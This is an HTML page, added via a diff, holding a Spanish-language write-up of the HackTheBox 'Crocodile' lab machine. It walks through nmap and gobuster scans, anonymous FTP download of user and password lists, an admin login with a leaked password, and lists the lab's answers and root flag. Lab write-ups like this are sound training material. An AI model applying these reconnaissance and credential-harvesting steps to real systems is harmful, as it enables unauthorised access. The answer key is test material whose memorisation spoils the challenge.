@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Crocodile HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/crocodile.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Crocodile HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Crocodile de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Crocodile de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Crocodile HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Crocodile HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Crocodile de la plataforma de HackTheBox","headline":"Writeup Crocodile HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Crocodile HackTheBox</h1>
+          <p>Resolución de la máquina Crocodile de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap, con -sCV para lanzar scripts de reconocimiento y ver versiones de los servicios corriendo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -sCV 10.129.239.154
+Nmap scan report for 10.129.239.154
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp          33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp          62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+|_http-server-header: Apache/2.4.41 (Ubuntu)</span>
+</code></pre></div></div>
+
+<div><p>Dandole un vistazo a la web realmente es una plantilla sin nada interesante</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Usando la extensión Wappalizer podemos ver que la web interpreta lenguaje php</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Podemos fuzzear archivos con extensiones php con ayuda de gobuster, podemos ver /login.php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -u 10.129.239.154 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php -t 100
+===============================================================
+[+] Url:                     http://10.129.239.154
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+[+] Extensions:              php
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 317] [--> http://10.129.239.154/assets/]
+/config.php           (Status: 200) [Size: 0]                                      
+/fonts                (Status: 301) [Size: 316] [--> http://10.129.239.154/fonts/] 
+/js                   (Status: 301) [Size: 313] [--> http://10.129.239.154/js/]    
+/css                  (Status: 301) [Size: 314] [--> http://10.129.239.154/css/]   
+/dashboard            (Status: 301) [Size: 320] [--> http://10.129.239.154/dashboard/]
+/logout.php           (Status: 302) [Size: 0] [--> login.php]                         
+</span><span class="kd">/login.php</span><span class="p">            (Status: 200) [Size: 1577]</span>
+</code></pre></div></div>
+
+<div><p>Al revisar login.php podemos ver pues.... un login</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>No tenemos credenciales ni es vulnerable a sqli, asi que veamos ftp ya que esta abierto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ftp </span><span class="p">10.129.239.154
+Connected to 10.129.239.154.
+220 (vsFTPd 3.0.3)
+Name (10.129.239.154:gato): </span><span class="kd">anonymous</span><span class="p">
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="kd">ftp></span><span class="p"> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+</span><span class="kd">ftp></span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un archivo de usuarios y otro que parece tener las contraseñas, los descargamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">ftp></span><span class="p"> get allowed.userlist
+local: allowed.userlist remote: allowed.userlist
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.00 secs (161.9425 kB/s)
+</span><span class="kd">ftp></span><span class="p"> get allowed.userlist.passwd
+local: allowed.userlist.passwd remote: allowed.userlist.passwd
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+226 Transfer complete.
+62 bytes received in 0.00 secs (304.2556 kB/s)
+</span><span class="kd">ftp></span><span class="p"> quit
+221 Goodbye.</span>
+</code></pre></div></div>
+
+<div><p>Leemos los archivos y efectivamente uno contiene usuarios y otro contraseñas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">allowed.userlist 
+aron
+pwnmeow
+egotisticalsw
+admin
+
+</span><span class="s2">❯ cat </span><span class="p">allowed.userlist.passwd 
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd</span>
+</code></pre></div></div>
+
+<div><p>Podemos probar las credenciales en el login y las de admin funcionan, admin : rKXM59ESxesUFHAd</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Una vez iniciada sesión con las credenciales podemos ver la flag</p></div>
+<a href="./5.png" target="_blank"><div><p><img src="./5.png"><p></div></a>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>What nmap scanning switch employs the use of default scripts during a scan?</strong></li>
+<ul><p></p><li>-sC</li></ul></blockquote><br>
+
+<blockquote><li><strong>What service version is found to be running on port 21?</strong></li>
+<ul><p></p><li>vsftpd 3.0.3</li></ul></blockquote><br>
+
+<blockquote><li><strong>What FTP code is returned to us for the "Anonymous FTP login allowed" message?</strong></li>
+<ul><p></p><li>230</li></ul></blockquote><br>
+
+<blockquote><li><strong>What command can we use to download the files we find on the FTP server?</strong></li>
+<ul><p></p><li>get</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is one of the higher-privilege sounding usernames in the list we retrieved?</strong></li>
+<ul><p></p><li>admin</li></ul></blockquote><br>
+
+<blockquote><li><strong>What version of Apache HTTP Server is running on the target host?</strong></li>
+<ul><p></p><li>2.4.41</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of a handy web site analysis plug-in we can install in our browser?</strong></li>
+<ul><p></p><li>Wappalyzer</li></ul></blockquote><br>
+
+<blockquote><li><strong>What switch can we use with gobuster to specify we are looking for specific filetypes?</strong></li>
+<ul><p></p><li>-x</li></ul></blockquote><br>
+
+<blockquote><li><strong>What file have we found that can provide us a foothold on the target?</strong></li>
+<ul><p></p><li>login.php</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>c7110277ac44d78b6a9fff2232434d16</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
